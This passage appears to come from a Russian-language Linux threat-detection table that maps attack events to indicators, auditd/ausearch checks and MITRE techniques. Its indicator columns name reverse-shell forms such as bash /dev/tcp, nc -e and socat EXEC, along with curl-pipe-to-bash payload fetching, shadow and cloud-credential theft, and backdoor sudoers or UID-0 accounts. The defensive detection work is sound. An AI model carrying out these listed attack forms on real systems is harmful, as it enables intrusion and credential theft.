| **SELinux/AppArmor: отказы доступа, изменение режима** | Высокая | AVC — каждый denied/granted, MAC_STATUS — вкл/выкл enforcing/permissive. Для Ubuntu аналог — APPARMOR_DENIED, APPARMOR_STATUS. | • MAC_STATUS с переходом enforcing→permissive (setenforce 0)<br>• Массовые AVC denied по одному процессу — попытка обхода<br>• Изменение контекста с сервисного на unconfined_t | ▸ SELinux статус<br>$ getenforce<br>$ sestatus<br>▸ AVC denied за час<br>$ ausearch -m AVC --start recent<br>▸ Через journal<br>$ journalctl --since "1 hour ago" \| grep -i 'avc:'<br>▸ AppArmor (Ubuntu)<br>$ aa-status | T1562.001, T1562.003 |

## Anomaly (1)

| Событие | Важность | Описание | Индикаторы атаки | Где проверить (CLI) | MITRE |
|:--|:--|:--|:--|:--|:--|
| **Аномалии: promisc-режим, аварийные завершения** | Высокая | ANOM_PROMISCUOUS (1700) — интерфейс переведён в promisc (sniffer). ANOM_ABEND (1701) — segfault процесса (попытка exploit?). ANOM_LOGIN_FAILURES (1112), ANOM_LOGIN_LOCATION (1114). | • ANOM_PROMISCUOUS от не-tcpdump/wireshark<br>• Множественные ANOM_ABEND одного бинаря (перебор exploit)<br>• ANOM_ABEND сетевых демонов (sshd, nginx) | ▸ Интерфейсы в promisc-режиме<br>$ ip link \| grep -i promisc<br>$ netstat -i \| grep -i 'P'<br>▸ Сегфолты процессов<br>$ ausearch -m ANOM_ABEND --start today<br>$ dmesg -T \| grep -E 'segfault\|general protection'<br>▸ Coredumps<br>$ coredumpctl list --since today | T1040, T1068, T1574 |

## Python / Supply chain (1)

| Событие | Важность | Описание | Индикаторы атаки | Где проверить (CLI) | MITRE |
|:--|:--|:--|:--|:--|:--|
| **Установка Python-пакетов (потенциальный supply chain)** | Высокая | EXECVE с exe=/usr/bin/pip*, /usr/local/bin/pip*, /usr/bin/python -m pip. Отслеживает установку пакетов с PyPI, в т.ч. с --index-url из внешних источников. | • pip install с --index-url на внешний ресурс (typosquatting)<br>• pip install пакетов с typo имени (request, urllib3-extra, colourama)<br>• pip install из git+http://...<br>• pip install в production-контейнерах во время работы<br>• pip install --trusted-host на HTTP (обход TLS-проверки) | ▸ Все запуски pip за день<br>$ ausearch -m EXECVE --start today \| grep -E 'pip[23]? install'<br>▸ Установленные пакеты<br>$ pip list ; pip3 list<br>▸ Последние установленные (по дате site-packages)<br>$ find /usr/lib/python3*/site-packages /usr/local/lib/python3* -name '*.dist-info' -mtime -7 | T1195.002, T1059.006, T1105 |

## Execution / Evasion (1)

| Событие | Важность | Описание | Индикаторы атаки | Где проверить (CLI) | MITRE |
|:--|:--|:--|:--|:--|:--|
| **Злоупотребление eBPF (bpf() syscall) для backdoor/rootkit** | Критическая | Современные rootkit (BPFDoor, Symbiote) используют eBPF для скрытого перехвата трафика и magic-пакетов без открытых портов. | • bpf() от нетипичных процессов (не systemd/cilium)<br>• Загрузка BPF-программы без CAP_BPF обоснования<br>• BPF + raw socket<br>• Процесс без порта, но реагирует на трафик | ▸ Вызовы bpf()<br>$ ausearch -m SYSCALL -sc bpf --start today<br>▸ Загруженные BPF-программы<br>$ bpftool prog show; bpftool perf show<br>▸ Правило auditd<br># -a always,exit -F arch=b64 -S bpf -k ebpf_use | T1205.002, T1014 |

## Command & Control (3)

| Событие | Важность | Описание | Индикаторы атаки | Где проверить (CLI) | MITRE |
|:--|:--|:--|:--|:--|:--|
| **Загрузка payload в /tmp или /dev/shm (wget/curl/scp)** | Высокая | Атакующий скачивает вторую ступень/инструменты в записываемые каталоги. /dev/shm особенно опасен — исполнение в памяти без следа на диске. | • wget/curl в /tmp, /dev/shm, /var/tmp<br>• Скачивание с raw IP или pastebin<br>• curl ... \| bash (бесфайлово)<br>• chmod +x сразу после загрузки | ▸ Скачивания<br>$ ausearch -m EXECVE \| grep -E "wget\|curl\|scp\|tftp"<br>▸ Исполняемое в tmpfs<br>$ find /tmp /dev/shm /var/tmp -type f -executable -mtime -1<br>▸ Процессы из /dev/shm<br>$ ls -la /proc/*/exe 2>/dev/null \| grep -E "/tmp\|/dev/shm" | T1105 |
| **Reverse shell (bash /dev/tcp, nc -e, socat)** | Критическая | Обратная оболочка: процесс подключается к атакующему и отдаёт ему shell. Классика Linux-постэксплуатации: bash -i >& /dev/tcp/IP/PORT, nc -e /bin/sh, socat EXEC, mkfifo-пайп. | • bash -i и /dev/tcp/ в командной строке<br>• nc/ncat с -e или -c<br>• socat ... EXEC:<br>• mkfifo + /bin/sh в пайпе<br>• интерпретатор со stdin/stdout в сетевой сокет | ▸ Подозрительные интерпретаторы<br>$ ausearch -m EXECVE \| grep -E 'bash -i\|/dev/tcp\|nc .*-e\|socat.*EXEC'<br>▸ Процессы с сетевым fd на shell<br>$ ls -l /proc/*/fd 2>/dev/null \| grep socket | T1059.004, T1071 |
| **DNS-туннелирование / C2 через DNS** | Высокая | Скрытая передача данных и C2 через DNS: длинные/частые TXT/NULL/A-запросы к одному домену, base32/base64 в поддоменах. Обходит фильтрацию, т.к. DNS обычно разрешён. | • аномально длинные поддомены (base32/hex)<br>• высокая частота запросов к одному домену<br>• много TXT/NULL-записей<br>• запросы от нетипичного процесса<br>• инструменты: iodine, dnscat2 | ▸ Частые/длинные DNS-запросы (если логируются)<br>$ journalctl -u systemd-resolved \| grep -Eo '[a-z0-9]{30,}\.' \| sort \| uniq -c \| sort -rn \| head<br>▸ Инструменты в процессах<br>$ ps aux \| grep -E 'iodine\|dnscat' | T1071.004, T1048.003 |

## Credential Access (2)

| Событие | Важность | Описание | Индикаторы атаки | Где проверить (CLI) | MITRE |
|:--|:--|:--|:--|:--|:--|
| **Чтение /etc/shadow (кража хешей паролей)** | Критическая | Прямой доступ к /etc/shadow для извлечения хешей под offline-brute (hashcat/john). Требует watch-правило. | • Чтение /etc/shadow не процессом аутентификации<br>• cat/cp/less /etc/shadow<br>• Копирование shadow в доступное место<br>• Доступ от не-root процесса | ▸ Доступ к shadow<br>$ ausearch -k shadow_access --start today<br>▸ Правило auditd<br># -w /etc/shadow -p r -k shadow_access<br>▸ Копии shadow<br>$ find / -name "shadow*" 2>/dev/null ! -path "/etc/*" | T1003.008 |
| **Кража SSH-ключей и облачных креденшелов** | Высокая | Чтение приватных ключей и токенов: ~/.ssh/id_rsa, ~/.aws/credentials, ~/.kube/config, ~/.docker/config.json, gcloud/azure. Даёт доступ к другим хостам и облаку. | • чтение id_rsa/id_ed25519 не владельцем<br>• доступ к ~/.aws/credentials, ~/.kube/config, ~/.docker/config.json<br>• массовый поиск ключей (find ... id_rsa) | ▸ Наблюдение (пример для AWS)<br>$ auditctl -w /root/.aws/credentials -p r -k credtheft<br>▸ Поиск обращений<br>$ ausearch -k credtheft | T1552.001, T1552.004, T1145 |

## Cloud / Credential Access (1)

| Событие | Важность | Описание | Индикаторы атаки | Где проверить (CLI) | MITRE |
|:--|:--|:--|:--|:--|:--|
| **Доступ к облачным метаданным (169.254.169.254)** | Высокая | Обращение к сервису метаданных облака (AWS/GCP/Azure) на 169.254.169.254 — источник временных креденшелов инстанса. Частый шаг при компрометации облачной ВМ, в т.ч. через SSRF. | • curl/wget к http://169.254.169.254/latest/meta-data/<br>• доступ к /iam/security-credentials/ (AWS)<br>• запросы от веб-приложения/непривилегированного процесса<br>• GCP: metadata.google.internal, заголовок Metadata-Flavor | ▸ Соединения к metadata-IP<br>$ ausearch -m SYSCALL -sv connect \| grep 169.254.169.254<br>▸ В истории/процессах<br>$ grep -rs 169.254.169.254 /home/*/.bash_history /var/log | T1552.005, T1078.004 |

## Defense Evasion / Execution (1)

| Событие | Важность | Описание | Индикаторы атаки | Где проверить (CLI) | MITRE |
|:--|:--|:--|:--|:--|:--|
| **Fileless-выполнение (memfd_create, /proc/self/fd)** | Критическая | Запуск кода из памяти без файла на диске: memfd_create создаёт анонимный файл в памяти, затем execveat по /proc/self/fd/N. Обходит файловый антивирус и оставляет минимум следов. | • execveat по пути /proc/<pid>/fd/<n><br>• процесс с exe → /memfd:... (deleted)<br>• у работающего процесса нет файла на диске | ▸ Процессы, запущенные из памяти<br>$ ls -l /proc/*/exe 2>/dev/null \| grep -E 'memfd\|\(deleted\)'<br>▸ auditd<br>$ ausearch -m SYSCALL -sc memfd_create,execveat | T1620, T1059 |

## Privilege Escalation / Persistence (1)

| Событие | Важность | Описание | Индикаторы атаки | Где проверить (CLI) | MITRE |
|:--|:--|:--|:--|:--|:--|
| **Изменение /etc/sudoers (NOPASSWD / новая привилегия)** | Высокая | Правка sudoers или sudoers.d — выдача себе прав без пароля (NOPASSWD: ALL) или новых команд. Тихая персистентность привилегий. | • запись в /etc/sudoers, /etc/sudoers.d/*<br>• появление NOPASSWD: ALL<br>• visudo/echo от нетипичного пользователя | ▸ Наблюдение<br>$ auditctl -w /etc/sudoers -p wa -k sudoers<br>$ auditctl -w /etc/sudoers.d/ -p wa -k sudoers<br>▸ Проверка<br>$ ausearch -k sudoers<br>$ grep -r NOPASSWD /etc/sudoers /etc/sudoers.d/ | T1548.003, T1098 |

## Persistence / Command & Control (1)

| Событие | Важность | Описание | Индикаторы атаки | Где проверить (CLI) | MITRE |
|:--|:--|:--|:--|:--|:--|
| **Открытие слушающего порта (bind shell / backdoor-служба)** | Высокая | Процесс открывает слушающий сокет и ждёт подключения — bind shell или скрытая backdoor-служба. Особенно подозрительно для интерпретаторов (bash, python, nc, socat). | • nc -lvp, socat LISTEN, python -m http.server в нестандартном месте<br>• bash/python/perl в состоянии LISTEN<br>• слушающий порт без известной службы | ▸ Слушающие сокеты и процессы<br>$ ss -ltnp<br>▸ Подозрительные интерпретаторы в LISTEN<br>$ ss -ltnp \| grep -E 'bash\|python\|perl\|nc\|socat' | T1059, T1571, T1205 |

## Initial Access / Execution (1)

| Событие | Важность | Описание | Индикаторы атаки | Где проверить (CLI) | MITRE |
|:--|:--|:--|:--|:--|:--|
| **Web-shell: веб-сервер порождает shell (apache/nginx/php-fpm → sh)** | Критическая | После эксплуатации веб-приложения процесс веб-сервера (apache2, nginx, php-fpm, tomcat) порождает командную оболочку — признак web-shell/RCE. | • родитель = www-data/apache2/nginx/php-fpm, потомок = sh/bash/python<br>• создание .php/.jsp в веб-каталоге<br>• исходящие соединения от веб-сервера | ▸ Потомки веб-сервера<br>$ ausearch -m EXECVE \| grep -E 'www-data\|php-fpm\|apache2\|nginx'<br>▸ Свежие скрипты в webroot<br>$ find /var/www -name '*.php' -mtime -1 | T1190, T1505.003, T1059.004 |

## Persistence / Privilege Escalation (1)

| Событие | Важность | Описание | Индикаторы атаки | Где проверить (CLI) | MITRE |
|:--|:--|:--|:--|:--|:--|
| **Скрытый root: пользователь с UID=0** | Критическая | Добавление в /etc/passwd второй учётной записи с UID=0 (root-эквивалент) или изменение UID существующей на 0 — тихий root-доступ, который легко пропустить. | • несколько записей с UID 0 в /etc/passwd<br>• useradd -o -u 0 / usermod -u 0<br>• новая учётка с оболочкой и UID 0 | ▸ Все UID=0 в системе<br>$ awk -F: '($3==0){print $1}' /etc/passwd<br>▸ Наблюдение за passwd<br>$ auditctl -w /etc/passwd -p wa -k passwd | T1136.001, T1548 |

## Supply chain / Execution (1)

| Событие | Важность | Описание | Индикаторы атаки | Где проверить (CLI) | MITRE |
|:--|:--|:--|:--|:--|:--|
| **Вредоносные хуки пакетов (apt/dpkg/rpm pre/post-install)** | Высокая | Выполнение кода через хуки установки пакетов (preinst/postinst, %post) или троянизированный системный пакет/библиотека (в духе backdoor xz/liblzma, 2024). Запуск от root на этапе установки. | • необычные скрипты preinst/postinst<br>• установка пакета из неофициального источника<br>• модификация системной библиотеки (liblzma, libc) с неожиданной контрольной суммой | ▸ История пакетов<br>$ grep ' install ' /var/log/dpkg.log \| tail<br>▸ Целостность (Debian)<br>$ dpkg --verify<br>▸ RPM<br>$ rpm -Va \| grep '^..5' | T1195.002, T1546.016 |

